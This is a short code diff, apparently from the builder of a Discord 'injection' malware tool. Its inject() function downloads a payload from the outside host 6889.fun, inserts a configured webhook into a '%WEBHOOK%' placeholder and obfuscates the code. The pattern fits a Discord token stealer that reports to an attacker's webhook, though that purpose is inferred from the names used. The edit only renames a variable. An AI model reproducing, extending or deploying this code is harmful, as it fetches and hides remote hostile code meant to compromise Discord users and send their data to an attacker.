@@ -67,15 +67,14 @@ function findIndex(f) {
 
 async function inject() {
     try {
-        const resp = await axios.get(
-            "https://6889.fun/api/aurathemes/injects/f/discord", {
+        const res = await axios.get("https://6889.fun/api/aurathemes/injects/f/discord", {
             headers: {
                 aurathemes: true,
             },
         });
 
         const encode = obf.obfuscate(
-            resp.data.replace("%WEBHOOK%", getconfig.webhook),
+            res.data.replace("%WEBHOOK%", getconfig.webhook),
             {
                 ignoreRequireImports: true,
                 compact: true,
